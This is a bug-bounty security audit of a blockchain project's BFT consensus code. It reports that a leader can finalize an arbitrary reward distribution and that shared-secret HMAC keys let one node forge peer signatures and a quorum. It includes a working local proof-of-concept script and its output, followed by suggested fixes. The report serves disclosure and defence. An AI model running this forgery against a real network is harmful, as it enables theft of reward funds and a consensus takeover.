# Critical BFT Audit: Arbitrary Reward Distribution and Quorum Forgery

## Metadata

- Bounty: rustchain-bounties #58
- Auditor: maelrx
- Wallet: RTCc068d2850639325b847e09fc6b8c01b0b88d7be8
- Repository: Scottcjn/Rustchain
- Commit reviewed: 0c42879
- Files reviewed: node/rustchain_bft_consensus.py, docs/RUSTCHAIN_PROTOCOL.md, docs/PROTOCOL.md, docs/epoch-settlement.md, SECURITY.md

## Finding

### Critical: a single BFT leader can finalize an arbitrary epoch reward distribution

The BFT settlement path accepts a leader-provided `distribution` if:

1. the values sum to 1.5 RTC;
2. every distribution key appears in the submitted `miners` list;
3. the submitted `merkle_root` matches that same submitted `miners` list.

It does not recompute the deterministic reward distribution from enrolled miners, multipliers, total weight, epoch pot, final-slot eligibility, or canonical node state. A Byzantine leader can therefore include the real miners but set every honest miner's reward to `0.0` and give the full epoch pot to itself or another controlled wallet. Honest validators that rely on `_validate_proposal()` will accept the proposal because the total still equals 1.5 RTC.

This breaks the protocol claim that rewards are distributed proportionally by antiquity weight and breaks PBFT's assumption that one faulty leader cannot make honest validators commit an invalid state transition.

### Critical amplifier: per-node HMAC keys are still forgeable by any node with the shared secret

The current mitigation derives per-node keys as:

```python
HMAC(shared_secret, node_id)
```

This makes signatures unique per `node_id`, but it does not prevent cross-node forgery when every validator has the same shared secret. Any node that can run the BFT engine can derive `node-B` and `node-C` keys locally, sign PREPARE/COMMIT messages as those peers, reach quorum, and finalize the forged settlement without peer participation.

## Location

- `node/rustchain_bft_consensus.py`: `_derive_node_key()`
- `node/rustchain_bft_consensus.py`: `_verify_signature()`
- `node/rustchain_bft_consensus.py`: `_validate_proposal()`
- `node/rustchain_bft_consensus.py`: `_check_prepare_quorum()`
- `node/rustchain_bft_consensus.py`: `_check_commit_quorum()`
- `node/rustchain_bft_consensus.py`: `_apply_settlement()`

## Root Cause

`_validate_proposal()` treats the leader's distribution as authoritative:

```python
total = sum(distribution.values())
if abs(total - 1.5) > 0.001:
    return False

miner_ids = {m.get('miner_id') for m in miners}
for miner_id in distribution:
    if miner_id not in miner_ids:
        return False

expected_merkle = self._compute_merkle_root(miners)
if proposal.get('merkle_root') != expected_merkle:
    return False
```

The function verifies internal consistency of the submitted payload, not correctness against the epoch's canonical eligible miner set or the documented reward formula.

Separately, `_derive_node_key()` derives every validator key from the same secret:

```python
return hmac.new(
    self.secret_key.encode(),
    node_id.encode(),
    hashlib.sha256
).hexdigest()
```

That means the same process that verifies peer signatures can also derive the signing key for every peer.

## Local Reproduction

Run from repository root:

```bash
uv run --no-project --with requests python - <<'PY'
import os, sys, sqlite3, tempfile, time, hmac, hashlib
sys.path.insert(0, 'node')
from rustchain_bft_consensus import BFTConsensus, ConsensusMessage, MessageType

fd, db_path = tempfile.mkstemp(suffix='.db')
os.close(fd)
bft = None
try:
    conn = sqlite3.connect(db_path)
    conn.execute('CREATE TABLE balances (miner_id TEXT PRIMARY KEY, amount_i64 INTEGER DEFAULT 0)')
    conn.execute('CREATE TABLE ledger (miner_id TEXT, delta_i64 INTEGER, tx_type TEXT, memo TEXT, ts INTEGER)')
    conn.commit()
    conn.close()

    bft = BFTConsensus('node-A', db_path, 'shared-secret-known-to-every-node')
    for node_id in ['node-B', 'node-C', 'node-D']:
        bft.register_peer(node_id, f'http://127.0.0.1/{node_id}')

    miners = [
        {'miner_id': 'honest-g4', 'multiplier': 2.5},
        {'miner_id': 'honest-x86', 'multiplier': 1.0},
        {'miner_id': 'attacker', 'multiplier': 0.1},
    ]
    distribution = {'honest-g4': 0.0, 'honest-x86': 0.0, 'attacker': 1.5}

    print('leader', bft.get_leader(), 'is_leader', bft.is_leader(), 'quorum', bft.get_quorum_size())
    print('malicious_distribution_validates', bft._validate_proposal({
        'epoch': 4242,
        'miners': miners,
        'distribution': distribution,
        'merkle_root': bft._compute_merkle_root(miners),
    }))

    proposal_msg = bft.propose_epoch_settlement(4242, miners, distribution)
    digest = proposal_msg.digest
    view = proposal_msg.view

    def forge(node_id, msg_type):
        ts = int(time.time())
        sign_data = f'{msg_type}:{view}:4242:{digest}:{ts}'
        node_key = bft._derive_node_key(node_id)
        sig = hmac.new(node_key.encode(), sign_data.encode(), hashlib.sha256).hexdigest()
        return ConsensusMessage(
            msg_type=msg_type,
            view=view,
            epoch=4242,
            digest=digest,
            node_id=node_id,
            signature=sig,
            timestamp=ts,
        )

    for node_id in ['node-B', 'node-C']:
        bft.handle_prepare(forge(node_id, MessageType.PREPARE.value))
    for node_id in ['node-B', 'node-C']:
        bft.handle_commit(forge(node_id, MessageType.COMMIT.value))

    conn = sqlite3.connect(db_path)
    rows = conn.execute('SELECT miner_id, amount_i64 FROM balances ORDER BY miner_id').fetchall()
    ledger = conn.execute('SELECT miner_id, delta_i64, tx_type, memo FROM ledger ORDER BY rowid').fetchall()
    conn.close()

    print('committed_epochs', sorted(bft.committed_epochs))
    print('balances', rows)
    print('ledger', ledger)
finally:
    if bft:
        bft._cancel_view_change_timer()
    os.unlink(db_path)
PY
```

Observed result:

```text
leader node-A is_leader True quorum 3
malicious_distribution_validates True
committed_epochs [4242]
balances [('attacker', 1500000), ('honest-g4', 0), ('honest-x86', 0)]
ledger [('honest-g4', 0, 'reward', 'epoch_4242_bft'), ('honest-x86', 0, 'reward', 'epoch_4242_bft'), ('attacker', 1500000, 'reward', 'epoch_4242_bft')]
```

## Expected vs Actual

Expected:

- A leader proposal should be valid only if every reward is recomputed from canonical epoch state.
- Honest validators should reject distributions that do not match the documented formula.
- One validator should not be able to derive peer signing keys or synthesize a quorum.

Actual:

- `_validate_proposal()` accepts an all-to-attacker distribution because the total is 1.5 RTC and all keys appear in the submitted miner list.
- A node with the shared BFT secret can derive peer HMAC keys for `node-B` and `node-C`.
- The local BFT engine accepts forged PREPARE/COMMIT messages and applies the forged settlement.

## Impact

- Fund theft / unauthorized reward capture from the epoch reward pot.
- Consensus safety failure: one faulty leader can make honest validators accept an invalid settlement.
- Quorum authenticity failure: one node with the shared secret can impersonate enough peers to finalize a settlement.
- The previously merged "per-node HMAC" hardening is not sufficient because derived peer keys are computable by every node.

## Suggested Fix

1. Make settlement validation deterministic:
   - load the canonical enrolled miners for the epoch from local node state;
   - recompute total weight and every reward in integer micro-RTC;
   - deterministically assign rounding remainder;
   - reject any proposal whose `miners`, `distribution`, `total_reward`, or `merkle_root` differs from the locally recomputed value.

2. Replace shared-secret peer authentication:
   - use Ed25519 node identities with a static `node_id -> public_key` registry; or
   - use pairwise secrets where node A cannot derive B-C or B-D signing keys; and
   - ensure tests cannot sign `node-B` messages by calling helpers on `node-A`.

3. Add regression tests:
   - malicious leader all-to-self distribution is rejected by followers;
   - one node cannot produce a valid signature for another `node_id`;
   - forged quorum cannot advance `_check_commit_quorum()`;
   - accepted proposal exactly matches deterministic reward recomputation.

## Confidence

- Overall confidence: 0.94
- Reproduction confidence: 0.98
- Severity confidence: 0.88

I classify this as Critical because it combines reward theft, invalid protocol state transition, and quorum forgery in the consensus settlement path.
